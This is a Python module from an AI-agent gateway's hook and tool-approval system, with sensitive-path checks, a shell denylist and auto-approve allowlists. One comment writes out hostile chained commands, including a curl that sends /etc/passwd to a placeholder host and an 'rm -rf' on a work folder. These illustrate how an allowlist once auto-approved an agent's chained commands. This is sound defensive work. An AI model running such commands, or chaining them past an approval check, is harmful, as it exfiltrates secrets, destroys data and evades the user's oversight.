"""Config-driven hook system for PersonalClaw's message pipeline.

Hooks intercept messages and tool calls based on rules in config.json.
Supports declarative rules and executable script hooks with timeout/sandboxing.
"""

import asyncio
import fnmatch
import json
import logging
import os
import time
import uuid
from collections.abc import Callable
from dataclasses import asdict, dataclass, field, replace
from pathlib import Path

from personalclaw import lasting_work, record_files
from personalclaw.atomic_write import atomic_write
from personalclaw.audit_subject import log_title
from personalclaw.safety_flags import strict_bool
from personalclaw.security import (
    denied_command,
    is_denied,
    is_sensitive_bash_command,
    is_sensitive_path,
)

logger = logging.getLogger(__name__)


# ── Hook Results ──

# Message hook action constants
HOOK_PASSTHROUGH = "passthrough"
HOOK_REPLY = "reply"
HOOK_MODIFY = "modify"
HOOK_INJECT_CONTEXT = "inject_context"

# Tool hook action constants
TOOL_ALLOW = "allow"
TOOL_AUTO_APPROVE = "auto_approve"
TOOL_DENY = "deny"

# Script hook events — agent loop lifecycle
HOOK_EVENT_AGENT_SPAWN = "AgentSpawn"
HOOK_EVENT_USER_PROMPT_SUBMIT = "UserPromptSubmit"
HOOK_EVENT_PRE_TOOL_USE = "PreToolUse"
HOOK_EVENT_POST_TOOL_USE = "PostToolUse"
HOOK_EVENT_STOP = "Stop"
HOOK_EVENT_PRE_RESPONSE = "PreResponse"
HOOK_EVENT_POST_RESPONSE = "PostResponse"
HOOK_EVENT_SESSION_START = "SessionStart"
HOOK_EVENT_SESSION_END = "SessionEnd"
HOOK_EVENT_MEMORY_WRITE = "MemoryWrite"
HOOK_EVENT_ERROR = "Error"
HOOK_EVENT_CONTEXT_COMPACT = "ContextCompact"
HOOK_EVENT_SUBAGENT_SPAWN = "SubagentSpawn"
HOOK_EVENT_TASK_COMPLETE = "TaskComplete"
HOOK_EVENT_APPROVAL_REQUEST = "ApprovalRequest"

HOOK_EVENTS = (
    HOOK_EVENT_AGENT_SPAWN,
    HOOK_EVENT_SESSION_START,
    HOOK_EVENT_USER_PROMPT_SUBMIT,
    HOOK_EVENT_PRE_TOOL_USE,
    HOOK_EVENT_POST_TOOL_USE,
    HOOK_EVENT_PRE_RESPONSE,
    HOOK_EVENT_POST_RESPONSE,
    HOOK_EVENT_MEMORY_WRITE,
    HOOK_EVENT_CONTEXT_COMPACT,
    HOOK_EVENT_SUBAGENT_SPAWN,
    HOOK_EVENT_TASK_COMPLETE,
    HOOK_EVENT_APPROVAL_REQUEST,
    HOOK_EVENT_ERROR,
    HOOK_EVENT_SESSION_END,
    HOOK_EVENT_STOP,
)


# ── Lifecycle event catalog ──
# The authoritative description of each lifecycle event and the ``$variables`` an
# action templated on it can interpolate. This lives next to ``_fire`` (which
# assembles the event payload below) so the catalog and the payload it documents
# can never drift. ``GET /api/triggers/variables`` serves this to both UIs — they
# do NOT mirror it. Each var is a ``$NAME`` placeholder substituted by
# ``action_providers.template.render_template`` (``$EVENT``/``$CONTEXT`` plus any
# payload key). ``blocking`` marks events whose action can short-circuit the loop.

# Every event carries these (the shared base every fire assembles + the matcher's
# context string).
_LIFECYCLE_BASE_VARS = ("$EVENT", "$CONTEXT", "$cwd")

LIFECYCLE_EVENT_CATALOG: tuple[dict, ...] = (
    {
        "event": HOOK_EVENT_AGENT_SPAWN,
        "label": "Agent spawn",
        "desc": "A new agent session is created.",
        "vars": _LIFECYCLE_BASE_VARS,
    },
    {
        "event": HOOK_EVENT_SESSION_START,
        "label": "Session start",
        "desc": "A chat/agent session begins.",
        "vars": _LIFECYCLE_BASE_VARS,
    },
    {
        "event": HOOK_EVENT_USER_PROMPT_SUBMIT,
        "label": "User prompt submit",
        "desc": "The user submits a turn — before the agent runs.",
        "vars": (*_LIFECYCLE_BASE_VARS, "$prompt"),
    },
    {
        "event": HOOK_EVENT_PRE_TOOL_USE,
        "label": "Pre tool use",
        "desc": "Before a tool runs — can block it.",
        "vars": (*_LIFECYCLE_BASE_VARS, "$tool_name", "$tool_input"),
        "blocking": True,
    },
    {
        "event": HOOK_EVENT_POST_TOOL_USE,
        "label": "Post tool use",
        "desc": "After a tool runs.",
        "vars": (*_LIFECYCLE_BASE_VARS, "$tool_name", "$tool_input", "$tool_response"),
    },
    {
        "event": HOOK_EVENT_PRE_RESPONSE,
        "label": "Pre response",
        "desc": "Before the agent streams its reply.",
        "vars": _LIFECYCLE_BASE_VARS,
    },
    {
        "event": HOOK_EVENT_POST_RESPONSE,
        "label": "Post response",
        "desc": "After the agent finishes its reply.",
        "vars": _LIFECYCLE_BASE_VARS,
    },
    {
        "event": HOOK_EVENT_MEMORY_WRITE,
        "label": "Memory write",
        "desc": "The agent writes a memory/lesson.",
        "vars": _LIFECYCLE_BASE_VARS,
    },
    {
        "event": HOOK_EVENT_CONTEXT_COMPACT,
        "label": "Context compact",
        "desc": "The conversation context is summarized.",
        "vars": _LIFECYCLE_BASE_VARS,
    },
    {
        "event": HOOK_EVENT_SUBAGENT_SPAWN,
        "label": "Subagent spawn",
        "desc": "A subagent is spawned.",
        "vars": (*_LIFECYCLE_BASE_VARS, "$subagent_id", "$parent_session_key", "$agent_role"),
    },
    {
        "event": HOOK_EVENT_TASK_COMPLETE,
        "label": "Task complete",
        "desc": "A task finishes.",
        "vars": _LIFECYCLE_BASE_VARS,
    },
    {
        "event": HOOK_EVENT_APPROVAL_REQUEST,
        "label": "Approval request",
        "desc": "A tool needs approval.",
        "vars": (*_LIFECYCLE_BASE_VARS, "$tool_name"),
    },
    {
        "event": HOOK_EVENT_ERROR,
        "label": "Error",
        "desc": "An error occurs in the loop.",
        "vars": _LIFECYCLE_BASE_VARS,
    },
    {
        "event": HOOK_EVENT_SESSION_END,
        "label": "Session end",
        "desc": "A session ends.",
        "vars": _LIFECYCLE_BASE_VARS,
    },
    {
        "event": HOOK_EVENT_STOP,
        "label": "Stop",
        "desc": "The agent loop stops.",
        "vars": _LIFECYCLE_BASE_VARS,
    },
)

#: Lifecycle events whose hook can short-circuit the loop (exit 2 → the tool is rejected).
#: Derived from the catalog's ``blocking`` flag so the fact is declared exactly once, and read by
#: :func:`hook_enforcement` and the trigger read model rather than re-listed per surface.
BLOCKING_EVENTS: frozenset[str] = frozenset(
    str(e["event"]) for e in LIFECYCLE_EVENT_CATALOG if e.get("blocking")
)

#: The events whose context holds only names: a session's key, an agent's, ids, counts, the tool an
#: approval is about. A hook hands them to its action as they are, so the action can use them as
#: names. Every other event's context is words someone wrote (the prompt a turn answers, the
#: agent's reply, an error's message, a task's title), and what a hook hands on of it goes through
#: the injection screen first and arrives fenced (:func:`hand_on`), so a new event is words until
#: it is listed here. ``PreToolUse`` and ``PostToolUse`` carry their call in the payload instead.
NAMES_ONLY_EVENTS: frozenset[str] = frozenset(
    {
        HOOK_EVENT_AGENT_SPAWN,
        HOOK_EVENT_SESSION_START,
        HOOK_EVENT_PRE_TOOL_USE,
        HOOK_EVENT_POST_TOOL_USE,
        HOOK_EVENT_PRE_RESPONSE,
        HOOK_EVENT_POST_RESPONSE,
        HOOK_EVENT_MEMORY_WRITE,
        HOOK_EVENT_CONTEXT_COMPACT,
        HOOK_EVENT_SUBAGENT_SPAWN,
        HOOK_EVENT_APPROVAL_REQUEST,
        HOOK_EVENT_SESSION_END,
    }
)

#: The three enforcement states of a lifecycle hook. Spelled as data because they are a wire
#: contract two UIs render, and because "armed vs unarmed" needs a third value for the events
#: where arming is meaningless — otherwise a `Stop` hook reads as a disarmed safety control.
ENFORCEMENT_ENFORCING = "enforcing"
ENFORCEMENT_NOT_ENFORCING = "not_enforcing"
ENFORCEMENT_ADVISORY = "advisory"
ENFORCEMENT_STATES: frozenset[str] = frozenset(
    {ENFORCEMENT_ENFORCING, ENFORCEMENT_NOT_ENFORCING, ENFORCEMENT_ADVISORY}
)


def hook_enforcement(event: str, *, enabled: bool, bound: bool) -> str:
    """Whether a lifecycle hook on ``event`` can actually block, given its binding.

    🔴 **The measured hole this exists to close (G40).** The same ``PreToolUse`` hook blocks or
    does not block depending on who references it, and nothing said which state a user's hook was
    in. Driven twice against the same six lifecycle hooks:

    * **Unbound** (no agent profile references the hook id) — the hook fired three times on the
      informational path and the write **still landed**. ``run_count`` climbed to 3, which reads
      as "my policy hook is working".
    * **Bound** (hook ids on the session agent's ``triggers``) — the tool line read
      ``(hook blocked: …)`` and the file was never created.

    Two firing paths, one hook kind:

    * :meth:`ScriptHookStore.fire_for_ids` — agent-scoped, reached from
      ``chat_runner._fire`` and ``provider_bridge``'s native ``hook_fire``. Its ``BLOCKED:``
      sentinel is what rejects a tool, and it fires **only** hook ids the session agent
      references. ``hook_ids`` empty → fires nothing.
    * :func:`fire_tool_hooks` → :meth:`ScriptHookStore.fire` — global, informational. Reached
      from the ACP ``EVENT_TOOL_CALL`` seam, ``subagent`` and ``llm_helpers``, where the tool is
      already running. Its results are discarded, so exit 2 there changes nothing.

    So a blocking hook enforces only while it is enabled AND bound. ``advisory`` is returned for
    the events that have no blocking seam at all, so an unbound ``Stop`` hook is not mislabelled
    as a disarmed control. Never returns ``enforcing`` on a maybe: an unresolvable binding is
    reported ``not_enforcing``, because a control that only *looks* armed is worse than none.

    **This is the hook's CAPABILITY, not a record of a fire (G89).** A hook can be
    ``enforcing`` — bound, enabled, blocking event — and still be *reached* through the
    informational seam for a given tool call, because an ACP ``EVENT_TOOL_CALL`` frame arrives
    already auto-approved. What that individual fire did is
    ``advisory`` vs ``blocked`` on the hook's ``last_status``; the two fields
    answer different questions and both are needed to read the row.
    """
    if event not in BLOCKING_EVENTS:
        return ENFORCEMENT_ADVISORY
    return ENFORCEMENT_ENFORCING if (enabled and bound) else ENFORCEMENT_NOT_ENFORCING


@dataclass
class HookResult:
    """Result of running message hooks."""

    action: str  # HOOK_PASSTHROUGH, HOOK_REPLY, HOOK_MODIFY, HOOK_INJECT_CONTEXT
    text: str = ""

    @staticmethod
    def passthrough() -> "HookResult":
        return HookResult(action=HOOK_PASSTHROUGH)

    @staticmethod
    def reply(text: str) -> "HookResult":
        return HookResult(action=HOOK_REPLY, text=text)

    @staticmethod
    def modify(text: str) -> "HookResult":
        return HookResult(action=HOOK_MODIFY, text=text)

    @staticmethod
    def inject_context(text: str) -> "HookResult":
        return HookResult(action=HOOK_INJECT_CONTEXT, text=text)


@dataclass
class ToolHookResult:
    action: str  # TOOL_ALLOW, TOOL_AUTO_APPROVE, TOOL_DENY
    reason: str = ""
    #: For a denial one of the shell's own controls made (``shell_denylist``, ``sensitive_path``):
    #: the control, and the rule it applied, which the call's one audit row names (:meth:`audit`).
    control: str = ""
    rule: str = ""
    #: Whether the verdict was made on the command the call would run rather than on its title
    #: (``acp.permission_authority.screen_tool_call``).
    on_command: bool = False

    def audit(self) -> dict[str, str]:
        """What a control's denial adds to the call's audit row: the control and its rule, masked
        as any text a person reads is. Empty for any other verdict."""
        from personalclaw.security import redact_for_display

        if not self.control:
            return {}
        return {"control": self.control, "rule": redact_for_display(self.rule)[:300]}

    @staticmethod
    def allow() -> "ToolHookResult":
        return ToolHookResult(action=TOOL_ALLOW)

    @staticmethod
    def auto_approve() -> "ToolHookResult":
        return ToolHookResult(action=TOOL_AUTO_APPROVE)

    @staticmethod
    def deny(reason: str) -> "ToolHookResult":
        return ToolHookResult(action=TOOL_DENY, reason=reason)

    @staticmethod
    def refuse(reason: str, *, control: str, rule: str) -> "ToolHookResult":
        """A denial by one of the shell's own controls, with one WARNING line naming it."""
        refused = ToolHookResult(action=TOOL_DENY, reason=reason, control=control, rule=rule)
        logger.warning("refused by %s before it ran: %s", control, refused.audit()["rule"])
        return refused


# ── Config Types ──


@dataclass
class ContextRule:
    """Inject context when any trigger keyword matches."""

    triggers: list[str] = field(default_factory=list)
    context: str = ""


@dataclass
class AutoReplyHook:
    """Auto-reply without LLM for pattern matches."""

    pattern: str = ""
    reply: str = ""
    exact: bool = False


@dataclass
class TransformHook:
    """Transform message before sending to LLM."""

    pattern: str = ""
    prefix: str = ""
    suffix: str = ""


@dataclass
class HooksConfig:
    """Loaded from config.json ``hooks`` section."""

    auto_approve_tools: list[str] = field(default_factory=list)
    auto_approve_sources: list[str] = field(default_factory=list)
    auto_approve_subagent_spawn: bool = False
    auto_approve_subagent_tools: bool = False
    auto_deny_tools: list[str] = field(default_factory=list)
    auto_replies: list[AutoReplyHook] = field(default_factory=list)
    transforms: list[TransformHook] = field(default_factory=list)
    context_rules: list[ContextRule] = field(default_factory=list)

    @classmethod
    def from_dict(cls, data: dict) -> "HooksConfig":
        """Parse hooks config from a dict (config.json ``hooks`` section)."""
        auto_replies = [
            AutoReplyHook(
                pattern=h.get("pattern", ""),
                reply=h.get("reply", ""),
                exact=h.get("exact", False),
            )
            for h in data.get("auto_replies", [])
        ]
        transforms = [
            TransformHook(
                pattern=h.get("pattern", ""),
                prefix=h.get("prefix", ""),
                suffix=h.get("suffix", ""),
            )
            for h in data.get("transforms", [])
        ]
        context_rules = [
            ContextRule(
                triggers=r.get("triggers", []),
                context=r.get("context", ""),
            )
            for r in data.get("context_rules", [])
        ]
        return cls(
            auto_approve_tools=data.get("auto_approve_tools", []),
            auto_approve_sources=data.get("auto_approve_sources", []),
            auto_approve_subagent_spawn=strict_bool(
                data.get("auto_approve_subagent_spawn"),
                field="hooks.auto_approve_subagent_spawn",
            ),
            auto_approve_subagent_tools=strict_bool(
                data.get("auto_approve_subagent_tools"),
                field="hooks.auto_approve_subagent_tools",
            ),
            auto_deny_tools=data.get("auto_deny_tools", []),
            auto_replies=auto_replies,
            transforms=transforms,
            context_rules=context_rules,
        )


# ── HookManager ──


class HookManager:
    """Process messages and tool calls through config-driven rules.

    Built with a fixed ``config``, it keeps that one (a test's, a room's). Built with a ``source``
    (:func:`live_hook_manager`, which the gateway uses), it reads the hook settings as they are at
    each decision, so an auto-approve pattern the owner removed stops approving and a deny they
    added applies to the next call. It was built once at startup and its ``reload`` had no caller,
    so neither did, until a restart (`approval_grants`, rule 1).
    """

    def __init__(
        self,
        config: HooksConfig | None = None,
        *,
        source: Callable[[], HooksConfig] | None = None,
    ):
        self._fixed = config or HooksConfig()
        self._source = source
        self._last_read = self._fixed

    @property
    def _config(self) -> HooksConfig:
        if self._source is None:
            return self._fixed
        try:
            self._last_read = self._source()
        except Exception:  # noqa: BLE001 - see below
            # A hook value that does not parse. The denies the settings last held still deny;
            # nothing they granted is granted, so every call a grant would have approved asks.
            logger.warning("hook settings did not parse; auto-approving nothing", exc_info=True)
            return replace(
                self._last_read,
                auto_approve_tools=[],
                auto_approve_sources=[],
                auto_approve_subagent_spawn=False,
                auto_approve_subagent_tools=False,
            )
        return self._last_read

    @property
    def auto_approve_subagent_spawn(self) -> bool:
        return self._config.auto_approve_subagent_spawn

    @property
    def auto_approve_subagent_tools(self) -> bool:
        return self._config.auto_approve_subagent_tools

    # ── Message hooks ──

    def on_message(self, text: str) -> HookResult:
        """Run message hooks. Returns first match or passthrough."""
        lower = text.lower()

        # Auto-replies (first match wins)
        for ar_hook in self._config.auto_replies:
            if ar_hook.exact:
                if lower == ar_hook.pattern.lower():
                    return HookResult.reply(ar_hook.reply)
            else:
                if ar_hook.pattern.lower() in lower:
                    return HookResult.reply(ar_hook.reply)

        # Transforms (first match wins)
        for tf_hook in self._config.transforms:
            if tf_hook.pattern.lower() in lower:
                modified = text
                if tf_hook.prefix:
                    modified = f"{tf_hook.prefix}\n{modified}"
                if tf_hook.suffix:
                    modified = f"{modified}\n{tf_hook.suffix}"
                return HookResult.modify(modified)

        # Context injection (all matching rules)
        injected: list[str] = []
        for rule in self._config.context_rules:
            if any(t.lower() in lower for t in rule.triggers):
                injected.append(rule.context)
        if injected:
            return HookResult.inject_context("\n\n".join(injected))

        return HookResult.passthrough()

    # ── Tool hooks ──

    def on_tool_call(
        self, tool_name: str, *, cwd: str | os.PathLike[str] | None = None
    ) -> ToolHookResult:
        """Check if a tool should be auto-approved, denied, or handled normally.

        *cwd* is the folder the call runs in, when the caller knows it (an agent CLI's session
        folder): a relative path in a shell command is read from there, and from the home's
        workspace when it is not given.
        """
        # Strip display prefixes (e.g. "Running: ls *" → "ls *") so config
        # patterns like "ls" or "rm *" match without the prefix.
        normalized = _normalize_tool_name(tool_name)

        # Sensitive path protection (always enforced, before all other checks)
        if tool_name.startswith("Reading "):
            # fs_read / ReadFile — check the path
            if is_sensitive_path(normalized):
                return ToolHookResult.refuse(
                    f"Blocked: access to sensitive path: {normalized}",
                    control="sensitive_path",
                    rule=normalized,
                )
        elif tool_name.startswith("Running: "):
            # execute_bash — check for reads of sensitive paths
            reason = is_sensitive_bash_command(normalized, cwd=cwd)
            if reason:
                return ToolHookResult.refuse(reason, control="sensitive_path", rule=reason)
            # The shell denylist, the check the native bash tool and every other command path
            # ask (`security.denied_command`): a command an agent CLI asks the host to run is
            # refused here, before any auto-approve pattern or card can offer it.
            if (denied := denied_command(normalized)) is not None:
                return ToolHookResult.refuse(
                    denied.refusal(),
                    control="shell_denylist",
                    rule=denied.pattern or denied.why(),
                )
            # A SYSTEM-SCHEDULER write is offered the substrate instead (§7 crit 12). The
            # ACP path gets the same gate as the native bash tool: a control on one of two dispatch
            # seams is a control the other silently skips, which is how the `web_watch` screen gap
            # opened. Reads pass — see `triggers/handoff.py` for the read/write split.
            from personalclaw.triggers.handoff import detect as _scheduler_handoff

            offer = _scheduler_handoff(normalized)
            if offer is not None:
                return ToolHookResult.deny(offer.observation)
        # PersonalClaw's own stores (the knowledge library's database and documents): read and
        # changed only through their own tools, so a read or a command that names one is refused
        # with the tool to use (`file_scope.store_named_in`), before anyone is asked to approve it.
        if tool_name.startswith(("Reading ", "Running: ")):
            from personalclaw.file_scope import store_named_in

            reason = store_named_in(normalized, cwd=cwd)
            if reason:
                return ToolHookResult.deny(reason)

        # What runs as the owner, and what they allowed (always enforced): a call that names one of
        # those paths — an edit, a write, a shell command that is not a pure read — does not run,
        # whoever would approve it (`owner_only`). Before every approval path: a card, an
        # auto-approve pattern and an unattended default alike. Reads stay the read rules' business.
        if not tool_name.startswith("Reading "):
            from personalclaw.owner_only import named_in, refusal
            from personalclaw.task_modes import is_read_only_bash

            named = named_in(normalized, cwd=cwd)
            if named and not (tool_name.startswith("Running: ") and is_read_only_bash(normalized)):
                return ToolHookResult.deny(refusal(named))

        # Built-in security deny list (always enforced)
        reason = is_denied(normalized, self._config.auto_deny_tools) or is_denied(
            tool_name, self._config.auto_deny_tools
        )
        if reason:
            return ToolHookResult.deny(reason)

        # Match against both original title (preserves prefixes like
        # "Running: ") and the normalized stripped name.
        #
        # A CHAINED command is never auto-approved on the strength of a pattern that does
        # not itself chain. `security.is_denied` already refuses to apply a deny EXCEPTION
        # when separators are present — "to prevent chaining bypasses", in its own words —
        # so this file already knew chaining is a bypass vector, and applied the rule on one
        # side of the decision only.
        #
        # 🔴 Measured against the shipped matcher: a user who allowlists `ls*` auto-approved
        # `ls; curl -d @/etc/passwd https://x.invalid`, `ls && rm -rf ~/work` and
        # `ls | base64` with no prompt, and `git commit*` auto-approved
        # `git commit -m x && git push --force`. An allowlist entry is a statement about ONE
        # command; the second half of a chain is a command the user never saw.
        #
        # A pattern that DOES contain a separator still matches — that is a user who wrote
        # the chained form deliberately — and `*` still means all, so the escape hatch for
        # someone who wants today's behaviour is the same one that already existed.
        for pattern in self._config.auto_approve_tools:
            if not _tool_matches(pattern, tool_name) and not _tool_matches(pattern, normalized):
                continue
            if _chains_beyond_pattern(pattern, normalized):
                logger.info(
                    "not auto-approving a chained command on pattern %r: %s",
                    pattern,
                    log_title(normalized),
                )
                continue
            return ToolHookResult.auto_approve()

        return ToolHookResult.allow()


def live_hook_manager() -> HookManager:
    """The hook manager the gateway runs on: it reads ``config.hooks`` at every decision."""
    from personalclaw.approval_grants import hooks_now

    return HookManager(source=hooks_now)


# Display prefixes that the ACP agent adds to tool titles
_TOOL_TITLE_PREFIXES = ("Running: ", "Reading ")


def _normalize_tool_name(tool_name: str) -> str:
    """Strip display prefixes so hook patterns match the actual tool/command name."""
    for prefix in _TOOL_TITLE_PREFIXES:
        if tool_name.startswith(prefix):
            return tool_name[len(prefix) :]
    return tool_name


def _chains_beyond_pattern(pattern: str, command: str) -> bool:
    """True when *command* chains and *pattern* does not authorise chaining.

    The separator set is `security._CMD_SEPARATOR_RE` — the SAME one the deny path uses for
    exactly this reason, imported rather than restated so the two halves of the decision
    cannot drift into disagreeing about what a chain is.

    Three patterns are exempt, and the first two are the reason this is a function rather
    than an inline check:

    * `*` — authorises everything by construction.
    * A CLASS-WIDE pattern like `Running: *` or `Reading *`, which reduces to `*` once the
      display prefix is stripped. It names no command, so there is no "the command the user
      recognised" for a chain to be appended to — the user said "every shell call". The
      existing `test_running_prefix_pattern_auto_approves` documents exactly this with
      `Running: export PATH=x && npm run test`, and it is what distinguishes a class-wide
      grant from `Running: ls*`, which names one command and stays guarded.
    * A pattern that itself contains a separator — a user who wrote the chained form meant it.
    """
    from personalclaw.security import _CMD_SEPARATOR_RE

    bare = pattern.strip()
    for prefix in _TOOL_TITLE_PREFIXES:
        if bare.startswith(prefix):
            bare = bare[len(prefix) :].strip()
            break
    if bare in ("*", "") or _CMD_SEPARATOR_RE.search(pattern):
        return False
    return bool(_CMD_SEPARATOR_RE.search(command))


def _tool_matches(pattern: str, tool_name: str) -> bool:
    """Match a tool pattern against a tool name.

    Supports: exact, ``prefix*``, ``*suffix``, ``*contains*``, ``*`` (all).
    Case-insensitive.
    """
    if pattern == "*":
        return True
    return fnmatch.fnmatch(tool_name.lower(), pattern.lower())


def validate_file_path(raw: str, *, sensitive: Callable[[str], bool] | None = None) -> str | None:
    """Validate and canonicalize a file path for dashboard file I/O.

    Enforces: is_sensitive_path(), realpath canonicalization.
    Returns the canonical path or None if rejected. ``sensitive`` is the check itself, made once by
    a caller that asks about many paths (a :class:`~personalclaw.security.SensitivePaths` for a
    walk, as :class:`~personalclaw.file_roots.Admission` makes); it defaults to
    :func:`~personalclaw.security.is_sensitive_path`, which is the same answer.

    A validator ANSWERS; it does not raise (issue 352). `os.path.realpath` on a path holding a
    NUL byte raises `ValueError: embedded null character`, and this function had no guard — so
    `?path=/tmp/a%00b` left an unhandled exception to become a raw 500 out of every endpoint
    that funnels here (`file-read`, `file-write`, `file-move`, `create-dir`, uploads, prompts).
    Measured: `validate_file_path("/tmp/a\\x00b")` raised rather than returning None.

    The `except` is the whole guard, deliberately. A NUL is the instance that was reported; "the
    OS refused to canonicalize this" is the class, so any future member gets the same refusal
    rather than a new 500. Both `ValueError` and `OSError` are caught because `realpath` can raise
    either depending on the input and platform.

    An explicit `"\\x00" in raw` check sat here first and was removed: mutation testing showed it
    could not change the answer, because the `except` already returns None for exactly those
    inputs. The NUL check that IS load-bearing lives in `security.is_sensitive_path`, which
    catches-and-continues rather than returning, and so needs to refuse on its own.
    """
    import os

    if not raw:
        return None
    try:
        path = os.path.realpath(os.path.expanduser(raw))
    except (ValueError, OSError):
        logger.debug("validate_file_path: uncanonicalizable path rejected", exc_info=True)
        return None
    if (sensitive or is_sensitive_path)(path):
        return None
    return path


def safe_read_file(path: str) -> str:
    """Read a file after enforcing ``is_sensitive_path``.

    Raises ``PermissionError`` if the path is sensitive.

    A NUL byte makes `Path.resolve()` raise `ValueError` (issue 352) — the same defect as in
    `validate_file_path`, reached through a different call shape. Refused as `PermissionError`
    so the answer is this function's OWN documented refusal: every caller already handles that,
    and none of them expected a `ValueError` from a path argument.
    """
    from pathlib import Path

    try:
        resolved = str(Path(path).expanduser().resolve())
    except (ValueError, OSError) as exc:
        raise PermissionError(f"Blocked: unusable path: {exc}") from exc
    if is_sensitive_path(resolved):
        raise PermissionError(f"Blocked: access to sensitive path: {resolved}")
    return Path(resolved).read_text(encoding="utf-8")


MAX_FILE_BYTES = 50 * 1024 * 1024  # 50 MB safety cap


class FileTooLargeError(Exception):
    """Raised when a file exceeds MAX_FILE_BYTES."""


def safe_read_file_bytes(raw: str) -> bytes | None:
    """Read file bytes through centralized is_sensitive_path() enforcement.

    Returns file content as bytes, or None if path is rejected or unreadable.
    """
    path = validate_file_path(raw)
    if path is None:
        return None
    from pathlib import Path

    p = Path(path)
    try:
        with p.open("rb") as fh:
            data = fh.read(MAX_FILE_BYTES + 1)
        if len(data) > MAX_FILE_BYTES:
            raise FileTooLargeError(f"File exceeds {MAX_FILE_BYTES // (1024 * 1024)} MB safety cap")
        return data
    except OSError:
        return None


# ── Script Hooks ──


@dataclass
class ScriptHook:
    """Executable hook that runs on a trigger event via a registered ActionProvider.

    Each hook record names its provider (``bash``, ``webhook``, …) and stores
    provider-specific config (e.g. ``{"command": "..."}`` for bash,
    ``{"url": "...", "method": "POST"}`` for webhook). The provider's
    ``execute()`` method handles the actual side-effect.

    Bash provider follows the ACP agent hook semantics:
    - exit 0: success (stdout → context for AgentSpawn/UserPromptSubmit, fenced, :func:`take_in`)
    - exit 2: block tool (PreToolUse only, stderr → LLM)
    - other: warning (stderr shown to user)

    ``capabilities`` is the grant a store trigger carries (`triggers.grants`): what the owner
    allowed its action to run, frozen when they said yes. A hook fires unattended on the agent's own
    events — every prompt, every tool call — so one whose action it is not allowed to run is refused
    like a trigger's (:func:`run_script_hook`).
    """

    id: str = ""
    name: str = ""
    event: str = HOOK_EVENT_USER_PROMPT_SUBMIT
    matcher: str = ""  # tool matcher for PreToolUse/PostToolUse (empty = all tools)
    provider: str = "bash"
    provider_config: dict = field(default_factory=dict)
    timeout: int = 30  # seconds
    enabled: bool = True
    capabilities: dict = field(default_factory=dict)
    last_run: float = 0.0
    # "ok" | "error" | "timeout" | "launched" | "queued" | "skipped_incident" | "held_for_rung" |
    # "blocked" (the exit-2 block was HONORED, or guardrails refused the action) | "advisory" (the
    # script asked to block and the seam could not honor it — G89) | "blocked_injection" (the
    # injection screen refused the text it was handed, so it did not run) | "withheld" (it ran,
    # and the screen refused what it printed). Every literal must have a key in
    # `triggers.history.HOOK_STATUS_TO_OUTCOME`, which reports an unmapped one as a failure.
    last_status: str = ""
    run_count: int = 0

    @property
    def workflow(self) -> dict:
        """The hook's action in the shape a store trigger holds its own (``workflow.inline``), which
        is the shape the grant reads (`triggers.grants`), so one rule answers for both."""
        return {"inline": {"provider": self.provider, "config": self.provider_config}}

    def to_dict(self) -> dict:
        return asdict(self)

    @classmethod
    def from_dict(cls, data: dict) -> "ScriptHook":
        capabilities = data.get("capabilities")
        return cls(
            id=data.get("id", str(uuid.uuid4())[:8]),
            name=data.get("name", ""),
            event=data.get("event", HOOK_EVENT_USER_PROMPT_SUBMIT),
            matcher=data.get("matcher", ""),
            provider=data.get("provider", "bash"),
            provider_config=dict(data.get("provider_config") or {}),
            timeout=data.get("timeout", 30),
            # On unless switched off; a switch that reads as neither yes nor no leaves the hook off,
            # since it runs a script (a raw "false" was truthy wherever the hook was checked).
            enabled=strict_bool(
                data.get("enabled"), field="script hook enabled", default=False, absent=True
            ),
            capabilities=dict(capabilities) if isinstance(capabilities, dict) else {},
            last_run=data.get("last_run", 0.0),
            last_status=data.get("last_status", ""),
            run_count=data.get("run_count", 0),
        )


#: A hook's fields that belong to one home, not to what the hook IS: whether it runs there, the
#: owner's yes to what it runs there (``capabilities``, `triggers.grants`), and what happened when
#: it ran. The hook counterpart of ``triggers.store.RUNTIME_FIELDS``, for the same two rules: a hook
#: from another home arrives without them (:func:`hook_arrived_from_another_home`), and two homes
#: never compare them (:func:`hook_what_it_is`). Every `ScriptHook` field is here or part of what
#: the hook is, and a test fails on one that is neither.
HOOK_RUNTIME_FIELDS: tuple[str, ...] = (
    "enabled",
    "capabilities",
    "last_run",
    "last_status",
    "run_count",
)


def hook_what_it_is(row: dict) -> dict:
    """A ``hooks.json`` row as a person made it: without :data:`HOOK_RUNTIME_FIELDS`, and without
    the provider-config keys that loosen whether its agent asks (`automation_posture`), which like
    a grant are the owner's yes in one home. What two homes compare, and all that a hook from
    another home brings with it."""
    from personalclaw.automation_posture import loosened_keys

    kept = {name: value for name, value in row.items() if name not in HOOK_RUNTIME_FIELDS}
    config = kept.get("provider_config")
    if isinstance(config, dict):
        dropped = loosened_keys(config)
        if dropped:
            kept["provider_config"] = {k: v for k, v in config.items() if k not in dropped}
    return kept


def hook_arrived_from_another_home(row: dict) -> dict:
    """A hook from another home, as it is brought into this one: what it is
    (:func:`hook_what_it_is`), switched off. A hook runs on the agent's own events — every prompt,
    every tool call — so one from elsewhere runs here only once someone here switches it on, which
    asks first for what it runs (``dashboard.handlers.triggers._switch_on_grant``). The rule every
    way one arrives applies — the ``hooks`` inventory entry's ``arrives``: a device sync, a snapshot
    or archive merge (``durability.reconcile.bring_in``), and a sync conflict resolved with the
    other machine's version or a drafted merge of a hook this home no longer has (one it has takes
    the version in as an edit, :func:`hook_edit_arrived_from_another_home`)."""
    arrived = hook_what_it_is(row)
    arrived["enabled"] = False
    return arrived


def hook_edit_arrived_from_another_home(here: dict, edited: dict) -> dict:
    """*edited* — a hook this home has (*here*) with the edit another home made to it taken in — as
    this home writes it: a device sync's rule for a hook only the other home changed since the two
    last agreed on it (the ``hooks`` inventory entry's ``edit_arrives``).

    *edited* holds what the hook is as the other home made it (:func:`hook_what_it_is`), and this
    home's switch, runs and grant (:data:`HOOK_RUNTIME_FIELDS`). The grant keeps only what the
    edited action still runs as it ran here (``triggers.grants.narrow``), as the editor's save keeps
    it, so a changed command waits for the owner's yes here: a yes is given where the owner is shown
    what runs."""
    from personalclaw.triggers import grants

    before, after = ScriptHook.from_dict(here), ScriptHook.from_dict(edited)
    grants.narrow(after, before)
    out = dict(edited)
    if after.capabilities != before.capabilities:
        out["capabilities"] = after.capabilities
    return out


@dataclass
class ScriptHookResult:
    """Result of executing a script hook."""

    hook_id: str
    hook_name: str
    event: str
    stdout: str = ""
    stderr: str = ""
    exit_code: int = -1
    error: str = ""
    duration_ms: int = 0

    @property
    def blocked(self) -> bool:
